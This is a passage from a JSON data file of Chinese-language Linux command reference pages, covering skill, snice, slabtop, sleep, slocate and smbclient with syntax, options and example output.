命令。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">skill</span> -<span class=\"hljs-built_in\">STOP</span> rman\n</code></pre>\n<p>如您所见，skill 决定您输入的参数（进程 ID、用户 ID 或命令）并进行相应操作。这可能会导致在某些情况下出现这样的问题：您可能具有同名的用户和命令。最好的示例是 \"oracle\" 进程，通常由用户 \"oracle\" 运行。因此，当您希望停止名为 \"oracle\" 的进程时，可执行以下命令：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">skill</span> -<span class=\"hljs-built_in\">STOP</span> oracle\n</code></pre>\n<p>用户 \"oracle\" 的所有进程都停止，包括您可能要使用的会话。要非常明确地执行命令，您可以选择使用一个新参数指定参数的类型。要停止一个名为 oracle 的命令，可执行以下命令：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">skill</span> -<span class=\"hljs-built_in\">STOP</span> -c oracle\n</code></pre>\n<p>snice命令的功能与skill类似。但它用于降低进程的优先级，而不是停止进程。首先，检查 top 输出：</p>\n<pre><code class=\"language-shell\">  <span class=\"hljs-attribute\">PID</span> USER     PRI  NI  SIZE  RSS SHARE STAT %CPU %MEM   TIME CPU COMMAND\n    <span class=\"hljs-attribute\">3</span> root      <span class=\"hljs-number\">15</span>   <span class=\"hljs-number\">0</span>     <span class=\"hljs-number\">0</span>    <span class=\"hljs-number\">0</span>     <span class=\"hljs-number\">0</span> RW    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">0</span>  <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">0</span>   <span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">00</span>   <span class=\"hljs-number\">0</span> kapmd\n<span class=\"hljs-attribute\">13680</span> oracle    <span class=\"hljs-number\">15</span>   <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">11336</span>  <span class=\"hljs-number\">10</span>M  <span class=\"hljs-number\">8820</span> T     <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">0</span>  <span class=\"hljs-number\">1</span>.<span class=\"hljs-number\">0</span>   <span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">00</span>   <span class=\"hljs-number\">0</span> oracle\n<span class=\"hljs-attribute\">13683</span> oracle    <span class=\"hljs-number\">15</span>   <span class=\"hljs-number\">0</span>  <span class=\"hljs-number\">9972</span> <span class=\"hljs-number\">9608</span>  <span class=\"hljs-number\">7788</span> T     <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">0</span>  <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">9</span>   <span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">00</span>   <span class=\"hljs-number\">0</span> oracle\n<span class=\"hljs-attribute\">13686</span> oracle    <span class=\"hljs-number\">15</span>   <span class=\"hljs-number\">0</span>  <span class=\"hljs-number\">9860</span> <span class=\"hljs-number\">9496</span>  <span class=\"hljs-number\">7676</span> T     <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">0</span>  <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">9</span>   <span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">00</span>   <span class=\"hljs-number\">0</span> oracle\n<span class=\"hljs-attribute\">13689</span> oracle    <span class=\"hljs-number\">15</span>   <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">10004</span> <span class=\"hljs-number\">9640</span>  <span class=\"hljs-number\">7820</span> T     <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">0</span>  <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">9</span>   <span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">00</span>   <span class=\"hljs-number\">0</span> oracle\n<span class=\"hljs-attribute\">13695</span> oracle    <span class=\"hljs-number\">15</span>   <span class=\"hljs-number\">0</span>  <span class=\"hljs-number\">9984</span> <span class=\"hljs-number\">9620</span>  <span class=\"hljs-number\">7800</span> T     <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">0</span>  <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">9</span>   <span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">00</span>   <span class=\"hljs-number\">0</span> oracle\n<span class=\"hljs-attribute\">13698</span> oracle    <span class=\"hljs-number\">15</span>   <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">10064</span> <span class=\"hljs-number\">9700</span>  <span class=\"hljs-number\">7884</span> T     <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">0</span>  <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">9</span>   <span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">00</span>   <span class=\"hljs-number\">0</span> oracle\n<span class=\"hljs-attribute\">13701</span> oracle    <span class=\"hljs-number\">15</span>   <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">22204</span>  <span class=\"hljs-number\">21</span>M <span class=\"hljs-number\">16940</span> T     <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">0</span>  <span class=\"hljs-number\">2</span>.<span class=\"hljs-number\">1</span>   <span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">00</span>   <span class=\"hljs-number\">0</span> oracle\n</code></pre>\n<p>现在，将 \"oracle\" 进程的优先级降低四个点。注意，该值越高，优先级越低。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">snice</span> +<span class=\"hljs-number\">4</span> -u oracle\n  <span class=\"hljs-attribute\">PID</span> USER     PRI  NI  SIZE  RSS SHARE STAT %CPU %MEM   TIME CPU COMMAND\n<span class=\"hljs-attribute\">16894</span> oracle    <span class=\"hljs-number\">20</span>   <span class=\"hljs-number\">4</span> <span class=\"hljs-number\">38904</span>  <span class=\"hljs-number\">32</span>M <span class=\"hljs-number\">26248</span> D N   <span class=\"hljs-number\">5</span>.<span class=\"hljs-number\">5</span>  <span class=\"hljs-number\">3</span>.<span class=\"hljs-number\">2</span>   <span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">01</span>   <span class=\"hljs-number\">0</span> oracle\n</code></pre>\n<p>注意，NI 列（nice 值）现在是 4，优先级现在设置为 20，而不是 15。这对于降低优先级非常有帮助。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "slabtop",
        "des": "实时显示内核slab内存缓存信息",
        "body": "<h1 id=\"slabtop\">slabtop</h1>\n<p>实时显示内核slab内存缓存信息</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>slabtop命令</strong> 以实时的方式显示内核“slab”缓冲区的细节信息。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">slabtop</span><span class=\"hljs-params\">(选项)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\">--delay=n, -d n：每n秒更新一次显示的信息，默认是每3秒；</span>\n<span class=\"hljs-comment\">--sort=S, -s S：指定排序标准进行排序（排序标准，参照下面或者man手册）；</span>\n<span class=\"hljs-comment\">--once, -o：显示一次后退出；</span>\n<span class=\"hljs-comment\">--version, -V：显示版本；</span>\n<span class=\"hljs-comment\">--help：显示帮助信息。</span>\n</code></pre>\n<p>排序标准：</p>\n<ul>\n<li>  a: sort by number of active objects</li>\n<li>  b: sort by objects per slab</li>\n<li>  c: sort by cache size</li>\n<li>  l: sort by number of slabs</li>\n<li>  v：sort by number of active slabs</li>\n<li>  n: sort by name</li>\n<li>  o: sort by number of objects</li>\n<li>  p: sort by pages per slab</li>\n<li>  s: sort by object size</li>\n<li>  u: sort by cache utilization</li>\n</ul>\n<h3 id=\"知识扩展\">知识扩展</h3>\n<p>内核的模块在分配资源的时候，为了提高效率和资源的利用率，都是透过slab来分配的。通过slab的信息，再配合源码能粗粗了解系统的运行情况，比如说什么资源有没有不正常的多，或者什么资源有没有泄漏。linux系统透过/proc/slabinfo来向用户暴露slab的使用情况。</p>\n<p>Linux 所使用的 slab 分配器的基础是 Jeff Bonwick 为 SunOS 操作系统首次引入的一种算法。Jeff 的分配器是围绕对象缓存进行的。在内核中，会为有限的对象集（例如文件描述符和其他常见结构）分配大量内存。Jeff 发现对内核中普通对象进行初始化所需的时间超过了对其进行分配和释放所需的时间。因此他的结论是不应该将内存释放回一个全局的内存池，而是将内存保持为针对特定目而初始化的状态。Linux slab 分配器使用了这种思想和其他一些思想来构建一个在空间和时间上都具有高效性的内存分配器。</p>\n<p>保存着监视系统中所有活动的 slab 缓存的信息的文件为/proc/slabinfo。</p>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">slabtop</span>\n\n <span class=\"hljs-attribute\">Active</span> / Total Objects (% used)    : <span class=\"hljs-number\">897519</span> / <span class=\"hljs-number\">1245930</span> (<span class=\"hljs-number\">72</span>.<span class=\"hljs-number\">0</span>%)\n <span class=\"hljs-attribute\">Active</span> / Total Slabs (% used)      : <span class=\"hljs-number\">38605</span> / <span class=\"hljs-number\">38605</span> (<span class=\"hljs-number\">100</span>.<span class=\"hljs-number\">0</span>%)\n <span class=\"hljs-attribute\">Active</span> / Total Caches (% used)     : <span class=\"hljs-number\">94</span> / <span class=\"hljs-number\">145</span> (<span class=\"hljs-number\">64</span>.<span class=\"hljs-number\">8</span>%)\n <span class=\"hljs-attribute\">Active</span> / Total Size (% used)       : <span class=\"hljs-number\">129558</span>.<span class=\"hljs-number\">22</span>K / <span class=\"hljs-number\">153432</span>.<span class=\"hljs-number\">58</span>K (<span class=\"hljs-number\">84</span>.<span class=\"hljs-number\">4</span>%)\n <span class=\"hljs-attribute\">Minimum</span> / Average / Maximum Object : <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">01</span>K / <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">12</span>K / <span class=\"hljs-number\">128</span>.<span class=\"hljs-number\">00</span>K\n\n  <span class=\"hljs-attribute\">OBJS</span> ACTIVE  USE OBJ SIZE  SLABS OBJ/SLAB CACHE SIZE NAME                   \n<span class=\"hljs-attribute\">440136</span> <span class=\"hljs-number\">171471</span>  <span class=\"hljs-number\">38</span>%    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">05</span>K   <span class=\"hljs-number\">6113</span>       <span class=\"hljs-number\">72</span>     <span class=\"hljs-number\">24452</span>K buffer_head\n<span class=\"hljs-attribute\">190086</span> <span class=\"hljs-number\">148576</span>  <span class=\"hljs-number\">78</span>%    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">05</span>K   <span class=\"hljs-number\">2437</span>       <span class=\"hljs-number\">78</span>      <span class=\"hljs-number\">9748</span>K selinux_inode_security\n<span class=\"hljs-attribute\">151840</span> <span class=\"hljs-number\">146366</span>  <span class=\"hljs-number\">96</span>%    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">48</span>K  <span class=\"hljs-number\">18980</span>        <span class=\"hljs-number\">8</span>     <span class=\"hljs-number\">75920</span>K ext3_inode_cache\n<span class=\"hljs-attribute\">144333</span> <span class=\"hljs-number\">144143</span>  <span class=\"hljs-number\">99</span>%    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">02</span>K    <span class=\"hljs-number\">711</span>      <span class=\"hljs-number\">203</span>      <span class=\"hljs-number\">2844</span>K avtab_node\n<span class=\"hljs-attribute\">130529</span> <span class=\"hljs-number\">128488</span>  <span class=\"hljs-number\">98</span>%    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">13</span>K   <span class=\"hljs-number\">4501</span>       <span class=\"hljs-number\">29</span>     <span class=\"hljs-number\">18004</span>K dentry_cache\n <span class=\"hljs-attribute\">99214</span>  <span class=\"hljs-number\">99071</span>  <span class=\"hljs-number\">99</span>%    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">03</span>K    <span class=\"hljs-number\">878</span>      <span class=\"hljs-number\">113</span>      <span class=\"hljs-number\">3512</span>K size-<span class=\"hljs-number\">32</span>\n <span class=\"hljs-attribute\">43834</span>  <span class=\"hljs-number\">28475</span>  <span class=\"hljs-number\">64</span>%    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">27</span>K   <span class=\"hljs-number\">3131</span>       <span class=\"hljs-number\">14</span>     <span class=\"hljs-number\">12524</span>K radix_tree_node\n <span class=\"hljs-attribute\">17818</span>   <span class=\"hljs-number\">9450</span>  <span class=\"hljs-number\">53</span>%    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">06</span>K    <span class=\"hljs-number\">302</span>       <span class=\"hljs-number\">59</span>      <span class=\"hljs-number\">1208</span>K size-<span class=\"hljs-number\">64</span>\n  <span class=\"hljs-attribute\">4602</span>   <span class=\"hljs-number\">4562</span>  <span class=\"hljs-number\">99</span>%    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">05</span>K     <span class=\"hljs-number\">59</span>       <span class=\"hljs-number\">78</span>       <span class=\"hljs-number\">236</span>K sysfs_dir_cache\n  <span class=\"hljs-attribute\">3220</span>   <span class=\"hljs-number\">2855</span>  <span class=\"hljs-number\">88</span>%    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">08</span>K     <span class=\"hljs-number\">70</span>       <span class=\"hljs-number\">46</span>       <span class=\"hljs-number\">280</span>K vm_area_struct\n  <span class=\"hljs-attribute\">2460</span>   <span class=\"hljs-number\">2114</span>  <span class=\"hljs-number\">85</span>%    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">12</span>K     <span class=\"hljs-number\">82</span>       <span class=\"hljs-number\">30</span>       <span class=\"hljs-number\">328</span>K size-<span class=\"hljs-number\">128</span>\n  <span class=\"hljs-attribute\">1564</span>   <span class=\"hljs-number\">1461</span>  <span class=\"hljs-number\">93</span>%    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">04</span>K     <span class=\"hljs-number\">17</span>       <span class=\"hljs-number\">92</span>        <span class=\"hljs-number\">68</span>K Acpi-Operand\n  <span class=\"hljs-attribute\">1540</span>   <span class=\"hljs-number\">1540</span> <span class=\"hljs-number\">100</span>%    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">33</span>K    <span class=\"hljs-number\">140</span>       <span class=\"hljs-number\">11</span>       <span class=\"hljs-number\">560</span>K inode_cache\n  <span class=\"hljs-attribute\">1524</span>    <span class=\"hljs-number\">466</span>  <span class=\"hljs-number\">30</span>%    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">01</span>K      <span class=\"hljs-number\">6</span>      <span class=\"hljs-number\">254</span>        <span class=\"hljs-number\">24</span>K anon_vma\n  <span class=\"hljs-attribute\">1440</span>    <span class=\"hljs-number\">515</span>  <span class=\"hljs-number\">35</span>%    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">05</span>K     <span class=\"hljs-number\">20</span>       <span class=\"hljs-number\">72</span>        <span class=\"hljs-number\">80</span>K avc_node\n  <span class=\"hljs-attribute\">1440</span>   <span class=\"hljs-number\">1154</span>  <span class=\"hljs-number\">80</span>%    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">19</span>K     <span class=\"hljs-number\">72</span>       <span class=\"hljs-number\">20</span>       <span class=\"hljs-number\">288</span>K filp\n  <span class=\"hljs-attribute\">1170</span>   <span class=\"hljs-number\">1023</span>  <span class=\"hljs-number\">87</span>%    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">05</span>K     <span class=\"hljs-number\">15</span>       <span class=\"hljs-number\">78</span>        <span class=\"hljs-number\">60</span>K ext3_xattr\n   <span class=\"hljs-attribute\">845</span>    <span class=\"hljs-number\">724</span>  <span class=\"hljs-number\">85</span>%    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">02</span>K      <span class=\"hljs-number\">5</span>      <span class=\"hljs-number\">169</span>        <span class=\"hljs-number\">20</span>K Acpi-Namespace\n   <span class=\"hljs-attribute\">638</span>    <span class=\"hljs-number\">315</span>  <span class=\"hljs-number\">49</span>%    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">35</span>K     <span class=\"hljs-number\">58</span>       <span class=\"hljs-number\">11</span>       <span class=\"hljs-number\">232</span>K proc_inode_cache\n   <span class=\"hljs-attribute\">450</span>    <span class=\"hljs-number\">434</span>  <span class=\"hljs-number\">96</span>%    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">25</span>K     <span class=\"hljs-number\">30</span>       <span class=\"hljs-number\">15</span>       <span class=\"hljs-number\">120</span>K size-<span class=\"hljs-number\">256</span>\n   <span class=\"hljs-attribute\">424</span>    <span class=\"hljs-number\">386</span>  <span class=\"hljs-number\">91</span>%    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">50</span>K     <span class=\"hljs-number\">53</span>        <span class=\"hljs-number\">8</span>       <span class=\"hljs-number\">212</span>K size-<span class=\"hljs-number\">512</span>\n   <span class=\"hljs-attribute\">312</span>    <span class=\"hljs-number\">107</span>  <span class=\"hljs-number\">34</span>%    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">05</span>K      <span class=\"hljs-number\">4</span>       <span class=\"hljs-number\">78</span>        <span class=\"hljs-number\">16</span>K delayacct_cache\n   <span class=\"hljs-attribute\">306</span>    <span class=\"hljs-number\">284</span>  <span class=\"hljs-number\">92</span>%    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">43</span>K     <span class=\"hljs-number\">34</span>        <span class=\"hljs-number\">9</span>       <span class=\"hljs-number\">136</span>K shmem_inode_cache\n   <span class=\"hljs-attribute\">303</span>    <span class=\"hljs-number\">108</span>  <span class=\"hljs-number\">35</span>%    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">04</span>K      <span class=\"hljs-number\">3</span>      <span class=\"hljs-number\">101</span>        <span class=\"hljs-number\">12</span>K pid\n   <span class=\"hljs-attribute\">300</span>    <span class=\"hljs-number\">261</span>  <span class=\"hljs-number\">87</span>%    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">19</span>K     <span class=\"hljs-number\">15</span>       <span class=\"hljs-number\">20</span>        <span class=\"hljs-number\">60</span>K skbuff_head_cache\n   <span class=\"hljs-attribute\">300</span>    <span class=\"hljs-number\">300</span> <span class=\"hljs-number\">100</span>%    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">12</span>K     <span class=\"hljs-number\">10</span>       <span class=\"hljs-number\">30</span>        <span class=\"hljs-number\">40</span>K bio\n   <span class=\"hljs-attribute\">260</span>    <span class=\"hljs-number\">260</span> <span class=\"hljs-number\">100</span>%   <span class=\"hljs-number\">32</span>.<span class=\"hljs-number\">00</span>K    <span class=\"hljs-number\">260</span>        <span class=\"hljs-number\">1</span>      <span class=\"hljs-number\">8320</span>K size-<span class=\"hljs-number\">32768</span>\n   <span class=\"hljs-attribute\">254</span>      <span class=\"hljs-number\">6</span>   <span class=\"hljs-number\">2</span>%    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">01</span>K      <span class=\"hljs-number\">1</span>      <span class=\"hljs-number\">254</span>         <span class=\"hljs-number\">4</span>K revoke_table\n   <span class=\"hljs-attribute\">236</span>     <span class=\"hljs-number\">55</span>  <span class=\"hljs-number\">23</span>%    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">06</span>K      <span class=\"hljs-number\">4</span>       <span class=\"hljs-number\">59</span>        <span class=\"hljs-number\">16</span>K fs_cache\n   <span class=\"hljs-attribute\">216</span>    <span class=\"hljs-number\">203</span>  <span class=\"hljs-number\">93</span>%    <span class=\"hljs-number\">1</span>.<span class=\"hljs-number\">00</span>K     <span class=\"hljs-number\">54</span>        <span class=\"hljs-number\">4</span>       <span class=\"hljs-number\">216</span>K size-<span class=\"hljs-number\">1024</span>\n   <span class=\"hljs-attribute\">214</span>    <span class=\"hljs-number\">214</span> <span class=\"hljs-number\">100</span>%    <span class=\"hljs-number\">2</span>.<span class=\"hljs-number\">00</span>K    <span class=\"hljs-number\">107</span>        <span class=\"hljs-number\">2</span>       <span class=\"hljs-number\">428</span>K size-<span class=\"hljs-number\">2048</span>\n   <span class=\"hljs-attribute\">203</span>     <span class=\"hljs-number\">83</span>  <span class=\"hljs-number\">40</span>%    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">02</span>K      <span class=\"hljs-number\">1</span>      <span class=\"hljs-number\">203</span>         <span class=\"hljs-number\">4</span>K biovec-<span class=\"hljs-number\">1</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "sleep",
        "des": "将目前动作延迟一段时间",
        "body": "<h1 id=\"sleep\">sleep</h1>\n<p>将目前动作延迟一段时间</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>sleep命令</strong> 暂停指定的时间。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\"><span class=\"hljs-built_in\">sleep</span></span>(参数)</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>时间：指定要暂停时间的长度。</p>\n<p>时间长度，后面可接 s、m、h 或 d，其中 s 为秒，m 为 分钟，h 为小时，d 为日数。</p>\n<h3 id=\"实例\">实例</h3>\n<p>有时在写一些以循环方式运行的监控脚本，设置时间间隔是必不可少的，下面是一个Shell进度条的脚本演示在脚本中生成延时。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-meta\">#!/bin/bash</span>\n\nb=<span class=\"hljs-string\">''</span>\n<span class=\"hljs-keyword\">for</span> ((i=0;<span class=\"hljs-variable\">$i</span>&lt;=100;i++))\n <span class=\"hljs-keyword\">do</span>\n <span class=\"hljs-built_in\">printf</span> <span class=\"hljs-string\">\"Progress:[%-100s]%d%%\\r\"</span> <span class=\"hljs-variable\">$b</span> <span class=\"hljs-variable\">$i</span>\n sleep 0.1\n b=<span class=\"hljs-comment\">#$b</span>\n <span class=\"hljs-keyword\">done</span>\n<span class=\"hljs-built_in\">echo</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "slocate",
        "des": "命令查找文件或目录",
        "body": "<h1 id=\"slocate\">slocate</h1>\n<p>命令查找文件或目录</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>slocate命令</strong> 是一个命令查找文件或目录。slocate本身具有一个数据库，里面存放了系统中文件与目录的相关信息。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\">slocate <span class=\"hljs-selector-attr\">[-u]</span><span class=\"hljs-selector-attr\">[--help]</span><span class=\"hljs-selector-attr\">[--version]</span><span class=\"hljs-selector-attr\">[-d &lt;目录&gt;]</span><span class=\"hljs-selector-attr\">[查找的文件]</span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-d&lt;目录&gt;或--database=&lt;目录&gt; 　指定数据库所在的目录。</span>\n<span class=\"hljs-deletion\">-u 　更新slocate数据库。</span>\n<span class=\"hljs-deletion\">--help 　显示帮助。</span>\n<span class=\"hljs-deletion\">--version 　显示版本信息。</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p>使用指令\"slocate\"显示文件名中含有关键字\"fdisk\"的文件路径信息，输入如下命令：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-variable\">$ </span>slocate fdisk <span class=\"hljs-comment\">#显示文件名中含有fdisk关键字的文件的路径信息 </span>\n</code></pre>\n<p>执行以上命令后，指令执行的输出信息如下：</p>\n<pre><code class=\"language-shell\">$ slocate fdisk <span class=\"hljs-comment\">#显示文件名中含有fdisk 关键字的文件的路径信息  </span>\n<span class=\"hljs-regexp\">/root/</span>cfdisk        <span class=\"hljs-comment\">#搜索到的文件路径列表  </span>\n<span class=\"hljs-regexp\">/root/</span>fdisk  \n<span class=\"hljs-regexp\">/root/</span>sfdisk  \n<span class=\"hljs-regexp\">/usr/i</span>nclude<span class=\"hljs-regexp\">/grub/i</span>eee1275/ofdisk.h  \n<span class=\"hljs-regexp\">/usr/</span>share<span class=\"hljs-regexp\">/doc/u</span>til-Linux/README.cfdisk  \n<span class=\"hljs-regexp\">/usr/</span>share<span class=\"hljs-regexp\">/doc/u</span>til-Linux/README.fdisk.gz  \n<span class=\"hljs-regexp\">/usr/</span>share<span class=\"hljs-regexp\">/doc/u</span>til-Linux<span class=\"hljs-regexp\">/examples/</span>sfdisk.examples.gz  \n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "smbclient",
        "des": "交互方式访问samba服务器",
        "body": "<h1 id=\"smbclient\">smbclient</h1>\n<p>交互方式访问samba服务器</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>smbclient命令</strong> 属于samba套件，它提供一种命令行使用交互式方式访问samba服务器的共享资源。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">smbclient</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-B&lt;ip地址&gt;：传送广播数据包时所用的IP地址；</span>\n<span class=\"hljs-deletion\">-d&lt;排错层级&gt;：指定记录文件所记载事件的详细程度；</span>\n<span class=\"hljs-deletion\">-E：将信息送到标准错误输出设备；</span>\n<span class=\"hljs-deletion\">-h：显示帮助；</span>\n<span class=\"hljs-deletion\">-i&lt;范围&gt;：设置NetBIOS名称范围；</span>\n<span class=\"hljs-deletion\">-I&lt;IP地址&gt;：指定服务器的IP地址；</span>\n<span class=\"hljs-deletion\">-l&lt;记录文件&gt;：指定记录文件的名称；</span>\n<span class=\"hljs-deletion\">-L：显示服务器端所分享出来的所有资源；</span>\n<span class=\"hljs-deletion\">-M&lt;NetBIOS名称&gt;：可利用WinPopup协议，将信息送给选项中所指定的主机；</span>\n<span class=\"hljs-deletion\">-n&lt;NetBIOS名称&gt;：指定用户端所要使用的NetBIOS名称；</span>\n<span class=\"hljs-deletion\">-N：不用询问密码；</span>\n<span class=\"hljs-deletion\">-O&lt;连接槽选项&gt;：设置用户端TCP连接槽的选项；</span>\n<span class=\"hljs-deletion\">-p&lt;TCP连接端口&gt;：指定服务器端TCP连接端口编号；</span>\n<span class=\"hljs-deletion\">-R&lt;名称解析顺序&gt;：设置NetBIOS名称解析的顺序；</span>\n<span class=\"hljs-deletion\">-s&lt;目录&gt;：指定smb.conf所在的目录；</span>\n<span class=\"hljs-deletion\">-t&lt;服务器字码&gt;：设置用何种字符码来解析服务器端的文件名称；</span>\n<span class=\"hljs-deletion\">-T&lt;tar选项&gt;：备份服务器端分享的全部文件，并打包成tar格式的文件；</span>\n<span class=\"hljs-deletion\">-U&lt;用户名称&gt;：指定用户名称；</span>\n<span class=\"hljs-deletion\">-w&lt;工作群组&gt;：指定工作群组名称。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>smb服务器：指定要连接的smb服务器。</p>\n<h3 id=\"实例\">实例</h3>\n<p> <strong>列出某个IP地址所提供的共享文件夹</strong> </p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">smbclient</span> -L <span class=\"hljs-number\">198.168.0.1</span> -U username%password\n</code></pre>\n<p> <strong>像ftp客户端一样使用smbclient</strong> </p>\n<pre><code class=\"language-shell\">smbclient <span class=\"hljs-regexp\">//</span><span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">0.1</span>/tmp  -U username%password\n</code></pre>\n<p>执行smbclient命令成功后，进入smbclient环境，出现提示符：<code>smb:/&gt;</code></p>\n<p>这里有许多命令和ftp命令相似，如cd 、lcd、get、megt、put、mput等。通过这些命令，我们可以访问远程主机的共享资源。</p>\n<p> <strong>直接一次性使用smbclient命令</strong> </p>\n<pre><code class=\"language-shell\">smbclient -c <span class=\"hljs-string\">\"ls\"</span>  <span class=\"hljs-regexp\">//</span><span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">0.1</span>/tmp  -U username%password\n</code></pre>\n<p>和</p>\n<pre><code class=\"language-shell\">smbclient <span class=\"hljs-regexp\">//</span><span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">0.1</span>/tmp  -U username%password\nsmb:/&gt;ls\n</code></pre>\n<p>功能一样的。</p>\n<p> <strong>创建一个共享文件夹</strong> </p>\n<pre><code class=\"language-shell\">smbclient -c <span class=\"hljs-string\">\"mkdir share1\"</span> <span class=\"hljs-regexp\">//</span><span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">0.1</span>/tmp -U username%password\n</code></pre>\n<p>如果用户共享<code>//192.168.0.1/tmp</code>的方式是只读的，会提示<code>NT_STATUS_ACCESS_DENIED making remote directory /share1</code></p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "smbpasswd",
        "des": "samba用户和密码管理工具",
